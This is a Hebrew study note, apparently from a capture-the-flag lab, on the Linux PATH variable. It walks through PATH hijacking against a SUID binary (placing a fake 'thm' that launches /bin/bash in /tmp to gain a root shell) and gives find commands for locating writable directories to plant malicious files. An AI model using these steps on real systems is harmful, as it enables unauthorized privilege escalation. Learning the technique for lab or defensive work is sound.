# משתנה PATH ופקודות שימושיות

## הסבר כללי

המשתנה **PATH** במערכת לינוקס מגדיר אילו תיקיות ייסרקו כאשר מריצים פקודה בלי לציין את הנתיב המלא שלה. כלומר, אם קיימת תוכנה או סקריפט בשם מסוים באחת התיקיות המופיעות ב-PATH – המערכת תריץ אותה.

### דוגמה:

אם נוסיף את התיקייה `/tmp` ל-PATH וניצור שם קובץ בשם `bash`, נוכל להריץ אותו כמו כל פקודה רגילה.

```bash
PATH=/tmp:$PATH
```

הפקודה הזו מוסיפה את הנתיב `/tmp` לתחילת משתנה PATH (כך שהמערכת תחפש קודם ב-/tmp).

---

## דוגמה מעשית – ניצול PATH להרצת קובץ בהרשאות גבוהות

בתרחיש הבא, היה קובץ בינארי עם הרשאות **SUID** (שומר על הרשאות המשתמש שיצר אותו – במקרה הזה root), והוא הריץ קובץ בשם `thm` בלי לציין נתיב מלא.

1. הוספנו את הנתיב `/tmp` ל-PATH:

   ```bash
   PATH=/tmp:$PATH
   ```

2. יצרנו שם קובץ בשם `thm`:

   ```bash
   echo "/bin/bash" > /tmp/thm
   chmod 777 /tmp/thm
   ```

3. כשהבינארי SUID קרא להריץ את `thm` – הוא מצא את הקובץ שיצרנו ב-`/tmp` והריץ אותו בהרשאות root.

4. קיבלנו shell של root.

---

## מציאת תיקיות ניתנות לכתיבה (Writable Directories)

כדי לבדוק אילו תיקיות במערכת ניתנות לכתיבה על-ידי המשתמש הנוכחי:

```bash
find / -writable 2>/dev/null
```

כדי לסנן תוצאות ולראות רק את הנתיבים הראשיים (בלי `/proc` ובלגן):

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

פקודות אלה חשובות מאוד לזיהוי מקומות שבהם ניתן להכניס קובץ זדוני או סקריפט שיכול להתבצע בהרשאות גבוהות.

---

## טיפ

אם תרצה להוסיף נתיב אחר זמנית למשתנה PATH, פשוט השתמש בפקודה הבאה:

```bash
PATH=/your/directory:$PATH
```

לדוגמה:

```bash
PATH=/opt/custom/bin:$PATH
```

ככה תוכל להריץ כל קובץ מתוך `/opt/custom/bin` כאילו הוא פקודה רגילה במערכת.
